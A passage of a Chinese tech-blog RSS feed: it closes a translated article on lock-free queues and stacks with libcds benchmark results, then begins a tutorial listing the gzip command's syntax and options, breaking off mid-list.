&lt;p&gt;那么，底线在哪里？入队和出队各自都有一个CAS。代价就是一旦列表被检测出违例，就会运行fix_list。代价究竟有多大？实验结果会告诉我们。&lt;/p&gt;
&lt;p&gt;大家可以在cds/intrusive.optimistic_queue.h文件，以及libcds库中的cds::intrusive::OptimisticQueue类中找到源代码。&lt;/p&gt;
&lt;h2&gt;无等待队列&lt;/h2&gt;
&lt;p&gt;为了完整地阐述经典队列，我们应该谈谈无等待队列算法。&lt;/p&gt;
&lt;p&gt;无等待几乎是算法中最严格的，算法的执行时间必须可限定并且可预测。在实践中，无等待算法通常比诸如无锁、无干扰算法性能要低。但它们数量众多，实现起来也不复杂。&lt;/p&gt;
&lt;p&gt;许多无等待算法结构是相当标准：不是执行一运算（例如入队/出队），而是先声明&lt;span style=&quot;color: #ff0000;&quot;&gt;——&lt;/span&gt;存储带参数的运算描述于一些可公开访问的共享存储中&lt;span style=&quot;color: #ff0000;&quot;&gt;，&lt;/span&gt;接着不停地开启并发线程。接着它们浏览存储中的描述符，并试着执行该代码。结果，很多线程以很高的负载执行相同的任务，仅有一个线程成功。&lt;/p&gt;
&lt;p&gt;诸如此类的C++算法实现复杂度，主要涉及如何实现存储，以及处理描述符的内存分配。&lt;/p&gt;
&lt;p&gt;libcds库没有实现无等待队列，是因为该队列作者在其研究中，性能测试结果不尽人意。&lt;/p&gt;
&lt;h2&gt;测试结果&lt;/h2&gt;
&lt;p&gt;本文中，我决定提供以上算法的测试结果。&lt;/p&gt;
&lt;p&gt;测试是综合性的，测试机为双核处理器，Debian Linux，Intel Dual Xeon X5670 2.93 GHz, 6 cores per processor + hyperthreading，总共24逻辑处理器。测试过程中，机器闲置达百分之九十。&lt;/p&gt;
&lt;p&gt;编译器为GCC4.8.2，优化参数为-O3 -march=native -mtune=native。&lt;/p&gt;
&lt;p&gt;测试队列来自cds::container命名空间，因此，它们是非侵入式的，即每个元素执行各种的内存分配。随后我们会将队列与采用互斥量（mutex）的std::queue&amp;lt;T, std::deque&amp;lt;T&amp;gt;&amp;gt;和std::queue&amp;lt;T, std::list&amp;lt;T&amp;gt;&amp;gt;标准同步实现做比较。&lt;/p&gt;
&lt;p&gt;T类型为两个整型的数据结构。所有无锁队列都基于Hazard Pointer。&lt;/p&gt;
&lt;h2&gt;持久性测试&lt;/h2&gt;
&lt;p&gt;该测试相当特殊，有一千万对入队/出队运算。第一部分，测试执行一千万入队，75%为入队运算，剩余25%为出队运算，即一千万的入队运算，二百五十万的出队运算）。第二部分，出队运算执行七百五十万次，直到队列为空。&lt;/p&gt;
&lt;p&gt;测试遵循以下理念：减小缓存分配器的不利影响，当然前提是分配器含有缓存。&lt;/p&gt;
&lt;p&gt;测试时间的绝对值：&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-55337&quot; src=&quot;/images/jobbole.com/3be67bfb4e77d1e56f6facca92130868.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;大家看到了什么？&lt;/p&gt;
&lt;p&gt;首先映入眼帘的是，有锁std::queue&amp;lt;T, std::deque&amp;lt;T&amp;gt;&amp;gt;被证明是最快的。怎么可能呢？我认为这个跟内存有关：std::deque以N元素的块来分配内存，而非每个元素。这暗示我们应该移除测试中分配器的影响，这会带来相当长的延迟，另外，还有互斥量。当然， libcds的所有侵入式容器版本，没有为元素分配内存。理应对它们进行测试。&lt;/p&gt;
&lt;p&gt;显而易见，无锁队列，针对MSQueue所有缜密的优化开出了丰硕的果实，即便不是那么完美。&lt;/p&gt;
&lt;h2&gt;生产者和消费者测试&lt;/h2&gt;
&lt;p&gt;这个测试相当切合实际，队列中包含N个生产者，N个消费者，分别执行百万条写运算，百万条读运算。图表中的线程数，为生产者和消费者的线程数之和。&lt;/p&gt;
&lt;p&gt;测试时间的绝对值：&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-55338&quot; src=&quot;/images/jobbole.com/acda3426f2f8e417ec57a06e9c929edd.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;此处可以看出无锁队列是相当优雅，胜出者为OpimisticQueue。这就是说该无锁数据结构的所有假设被证明都是正确的。&lt;/p&gt;
&lt;p&gt;本测试接近实际情形，队列中没有出现大量元素堆积现象。为什么呢？个人认为，分配器内在的优化在起作用。确实如此，在最后阶段，队列的存在不是为了大量元素堆积，而是削峰，通常队列中是不存在元素的。&lt;/p&gt;
&lt;h2&gt;关于栈的补充说明&lt;/h2&gt;
&lt;p&gt;既然谈到测试，就来谈谈栈。&lt;/p&gt;
&lt;p&gt;本文以及前文所涉及的无锁栈，针对Treiber栈，我移除了回退（back-off）。不论实现，亦或者伪码描述、C++完整产品实现，理应单独作为一篇文章。不过我可能永远不会写，因为其中所涉及的代码是在太多。实际上，你会发现移除回退（back-off）之后，若你查看源码，完全不同。截止目前，只有libcds库里有。&lt;/p&gt;
&lt;p&gt;同样，我也提供了综合测试结果，测试机器和前面的一样。&lt;/p&gt;
&lt;p&gt;生产者和消费者测试：一些线程会写入栈中即压栈，而另一些线程会读取栈即弹栈。一组相同数量的生产者和消费者，生产者和消费者的线程总数都是百万级。标准的栈，其同步由互斥量完成。&lt;/p&gt;
&lt;p&gt;测试时间的绝对值：&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-55339&quot; src=&quot;/images/jobbole.com/4d505ad17f6363052e03dec0ca808d45.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;显而易见，图表本身就可以很好地说明事实。&lt;/p&gt;
&lt;p&gt;移除回退（back-off）之后，什么促使性能的显著增加？好像是因为压栈、弹栈相互抵消。然而，我们查看内部统计，就会发现百万个执行仅有十万到十五万个压栈、弹栈相互抵消，大约为0.1%。而移除回退整个进入数大约为三十五万。这说明移除回退最大的优势就是一些线程在负载高的时候休眠，进而自动降低了整个栈的负载。现实的例子，移除回退（back-off）的休眠线程会持续大约5毫秒。&lt;/p&gt;
&lt;h2&gt;总结&lt;/h2&gt;
&lt;p&gt;本文阐述了经典无锁队列，展示了列表元素。该对列显著的特点就是存在两个并发端-头部和尾部。接着缜密地阐述了Michael和Scott经典算法的一些改进。我希望你会对此感兴趣，并能在每天的生活中用到它。&lt;/p&gt;
&lt;p&gt;从测试结果看，尽管队列是无锁的，但神奇的CAS并没有带来任何特别的性能提升。因此，很有必要寻找其它一些方法消除瓶颈即头部和尾部，在某种程度上实现队列并行工作。&lt;/p&gt;
&lt;p&gt;这就是接下来我们要探讨的。&lt;/p&gt;
&lt;p&gt;无锁数据结构&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.jobbole.com/90810/&quot;&gt;引言&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;基础篇&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.jobbole.com/90811/&quot;&gt; 原子性和原子性原语&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://irl.cs.ucla.edu/~yingdi/web/paperreading/whymb.2010.06.07c.pdf&quot;&gt; 内存栅障&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://kukuruku.co/hub/cpp/lock-free-data-structures-memory-model-part-3&quot;&gt; 内存模型&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;机制篇&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://kukuruku.co/hub/cpp/lock-free-data-structures-the-inside-memory-management-schemes&quot;&gt;内存管理规则&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://kukuruku.co/hub/cpp/lock-free-data-structures-the-inside-rcu&quot;&gt; RCU&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://kukuruku.co/hub/cpp/lock-free-data-structures-the-evolution-of-a-stack&quot;&gt;栈的演进&lt;/a&gt;&lt;/p&gt;

        
            &lt;blockquote class=&quot;rewards&quot;&gt;
        &lt;p&gt;&lt;strong&gt;打赏支持我翻译更多好文章，谢谢！&lt;/strong&gt;&lt;/p&gt;
        &lt;a href=&quot;#rewardbox&quot; id=&quot;rewards-button&quot; class=&quot;fancybox&quot;&gt;&lt;span class=&quot;btn-bluet-blue href-style&quot;&gt;&lt;i class=&quot;fa fa-jpy&quot;&gt;&lt;/i&gt; 打赏译者&lt;/span&gt;&lt;/a&gt;
    &lt;/blockquote&gt;

    &lt;div id=&quot;rewardbox&quot;&gt;
        &lt;h4&gt;打赏支持我翻译更多好文章，谢谢！&lt;/h4&gt;
                &lt;p&gt;任选一种支付方式&lt;/p&gt;
                
    &lt;/div&gt;

    
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109648&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109648votetotal&quot;&gt;2&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109648&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt; 6 收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;

&lt;div id=&quot;author-bio&quot;&gt;
	
	&lt;h3 class=&quot;widget-title&quot;&gt;
	关于作者：&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/qiaofeng&quot;&gt;乔永琪&lt;/a&gt;
	&lt;/h3&gt;
	&lt;div class=&quot;alignleft&quot;&gt;
		&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/qiaofeng&quot;&gt;
			&lt;img src=&quot;/images/jobbole.com/e548efa6f888f48c5a171bebd28382ec.jpg&quot;&gt;
		&lt;/a&gt;
	&lt;/div&gt;

    &lt;div class=&quot;author-bio-info&quot;&gt;

        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            （新浪微博：@甜菜碱）        &lt;/span&gt;
        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            &lt;a href=&quot;http://www.jobbole.com/members/qiaofeng&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; 个人主页&lt;/a&gt; ·
            &lt;a href=&quot;http://blog.jobbole.com/author/qiaofeng/&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-file-text-o&quot;&gt;&lt;/i&gt; 我的文章&lt;/a&gt;

             · &lt;a title=&quot;声望值&quot; target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/qiaofeng/reputation/&quot;&gt;&lt;i class=&quot;fa fa-graduation-cap&quot;&gt;&lt;/i&gt; 18&lt;/a&gt;        &lt;/span&gt;
    &lt;/div&gt;
	&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Thu, 12 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-12-109648-f5c5f3dd1.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-12-109648-f5c5f3dd1.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>每天一个 Linux 命令（32）：gzip 命令</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;减少文件大小有两个明显的好处，一是可以减少存储空间，二是通过网络传输文件时，可以减少传输的时间。gzip是在Linux系统中经常使用的一个对文件进行压缩和解压缩的命令，既方便又好用。gzip不仅可以用来压缩大的、较少使用的文件以节省磁盘空间，还可以和tar命令一起构成Linux操作系统中比较流行的压缩文件格式。据统计，gzip命令对文本文件有60%～70%的压缩率。&lt;/p&gt;
&lt;p&gt;1．命令格式：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b4e591173298&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
gzip[参数][文件或者目录]&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b4e591173298-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b4e591173298-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;gzip&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;参数&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;文件或者目录&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;2．命令功能：&lt;/p&gt;
&lt;p&gt;gzip是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多出”.gz”的扩展名。&lt;/p&gt;
&lt;p&gt;3．命令参数：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b57431227915&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
-a或--ascii 　使用ASCII文字模式。 

-c或--stdout或--to-stdout 　把压缩后的文件输出到标准输出设备，不去更动原始文件。 

-d或--decompress或----uncompress 　解开压缩文件。 

-f或--force 　强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接。 

-h或--help 　在线帮助。 

-l或--list 　列出压缩文件的相关信息。 

-L或--license 　显示版本与版权信息。 

-n或--no-name 　压缩文件时，不保存原来的文件名称及时间戳记。 

-N或--name 　压缩文件时，保存原来的文件名称及时间戳记。 

-q或--quiet 　不显示警告信息。 

-r或--recursive 　递归处理，将指定目录下的所有文件及子目录一并处理。 

-S&amp;lt;压缩字尾字符串&amp;gt;或----suffix&amp;lt;压缩字尾字符串&amp;gt; 　更改压缩字尾字符串。 

-t或--test 　测试压缩文件是否正确无误。 

-v或--verbose 　显示指令执行过程。 

-V或--version 　显示版本信息。 

-num 用指定的数字num调整压缩的速度，-1或--fast表示最快压缩方法（低压缩比），-9或--best表示最慢压缩方法（高压缩比）。系统缺省值为6。&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b57431227915-31&quot;&gt;31&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-1&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;a&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;ascii&lt;/span&gt; 　使用&lt;span class=&quot;crayon-i&quot;&gt;ASCII&lt;/span&gt;文字模式。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;c&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;stdout&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;stdout&lt;/span&gt; 　把压缩后的文件输出到标准输出设备，不去更动原始文件。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;d&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;decompress&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;uncompress&lt;/span&gt; 　解开压缩文件。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;f&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;force&lt;/span&gt; 　强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;h&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;help&lt;/span&gt; 　在线帮助。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;l&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;list&lt;/span&gt; 　列出压缩文件的相关信息。 &lt;/div&gt;
